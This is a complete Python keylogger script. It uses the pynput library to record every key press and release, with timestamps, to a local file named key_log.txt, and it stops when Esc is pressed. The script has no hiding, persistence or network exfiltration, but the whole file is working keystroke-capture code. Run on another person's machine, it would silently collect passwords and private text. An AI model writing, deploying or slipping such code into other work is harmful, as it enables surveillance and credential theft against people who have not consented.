from pynput.keyboard import Key, Listener
import logging
import os

# Set up logging to a file
log_dir = os.path.dirname(os.path.abspath(__file__))  # Get the directory of the script
log_file = os.path.join(log_dir, "key_log.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
logging.info("Keylogger started...")  # Log start of keylogger

def on_press(key):
    if hasattr(key, 'char'):
        key_info = f"Key pressed: {key.char}"
    else:
        key_info = f"Special key pressed: {key}"
    
    logging.info(key_info)  # Log to the file

def on_release(key):
    key_info = f"Key released: {key}"
    logging.info(key_info)  # Log to the file
    
    if key == Key.esc:
        # Stop listener
        logging.info("Keylogger stopped.")
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
